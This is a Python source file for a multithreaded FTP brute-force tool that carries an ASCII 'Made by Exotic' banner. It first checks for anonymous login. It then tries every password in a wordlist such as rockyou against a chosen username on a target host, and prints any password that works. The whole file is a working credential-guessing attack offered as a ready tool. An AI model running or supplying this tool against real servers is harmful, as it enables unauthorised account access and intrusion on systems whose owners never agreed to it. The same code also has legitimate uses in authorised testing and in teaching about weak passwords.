import ftplib
import optparse
import sys
import socket
import threading

MAX_CONNECTION = 10
screen_lock = threading.BoundedSemaphore(MAX_CONNECTION)
found = False


def logBanner():
    banner =r"""
$$$$$$$$\                      $$\     $$\           
$$  _____|                     $$ |    \__|          
$$ |      $$\   $$\  $$$$$$\ $$$$$$\   $$\  $$$$$$$\ 
$$$$$\    \$$\ $$  |$$  __$$\\_$$  _|  $$ |$$  _____|
$$  __|    \$$$$  / $$ /  $$ | $$ |    $$ |$$ /      
$$ |       $$  $$<  $$ |  $$ | $$ |$$\ $$ |$$ |      
$$$$$$$$\ $$  /\$$\ \$$$$$$  | \$$$$  |$$ |\$$$$$$$\ 
\________|\__/  \__| \______/   \____/ \__| \_______|
                                                     
FTP bruteforce! Made by Exotic!! v1.1                                                     
                                                     
"""
    print (banner)

def checkConnetion(host, port):
    try:
        s = socket.socket()
        s.connect((host,port))
        return True
    except:
        return False

def anonyLog(host):
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous')
        print("[+] Anonymous FTP login is enable!")
        return True
    except:
        print("[-] Anoymous FTP login is disable!")
        return False

def BruteLog(host, passwords, username, release):
    global found
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, passwords)
        print("[+] Password Found: {}".format(passwords))
        found = True
    except ftplib.error_perm as e:
        if not('Login incorrect' in str(e)):
            print("[-] Check the username again")
            exit(0)
    finally:
         if release: screen_lock.release()


def main():
    logBanner()
    parser = optparse.OptionParser(usage="Usage {} [-H | --host= HOST TARGET] [-p | --passwords= PASSWORD FILE] [-U | --username= USERNAME TARGET] ".format(sys.argv[0]), version="{} 1.0".format(sys.argv[0]))
    parser.add_option('-H','--host=', dest='tgtHost', type='string', help='specify the host target')
    parser.add_option('-p','--passwords=', dest='tgtPasswords', type='string', help='specify the passwords file')
    parser.add_option('-U','--username=', dest='tgtUsername', type='string', help='specify the username target')
    (options, args) = parser.parse_args()
    if (options.tgtHost == None) or (options.tgtPasswords == None) or (options.tgtUsername == None):
        print (parser.usage)
        exit(0)
    else:
        tgtHost = options.tgtHost
        tgtPasswords = options.tgtPasswords
        tgtUsername = options.tgtUsername
    if checkConnetion(tgtHost, 21) is False:
        print("[-] Check that FTP server is running on port 21!")
        exit(0)
    if anonyLog(tgtHost):
        keep_brute = input("Do you want to keep bruteforcing (Y/N)? ")
        if not(keep_brute.lower() == 'y'):
            exit(0)
    try:
        if "rockyou" in str(tgtPasswords):
            pass_file = open(tgtPasswords, 'r', encoding='ISO-8859-1')
        else:
            pass_file = open(tgtPasswords, 'r')
    except Exception as e:
        if 'Permission denied' in str(e):
            print("Check the password file permission!")
            exit(0)
        else:
            print("There was en error: {}".format(e))
            exit(0)
    passwords = (line.strip("\r").strip("\n") for line in pass_file.readlines())
    for password in passwords:
        if found:
            exit(0)
        screen_lock.acquire()
        print("[*] Testing Password {}".format(password))
        t = threading.Thread(target = BruteLog, args =(tgtHost,password,tgtUsername,True))
        t.start()
            

if __name__ == "__main__":
    main()
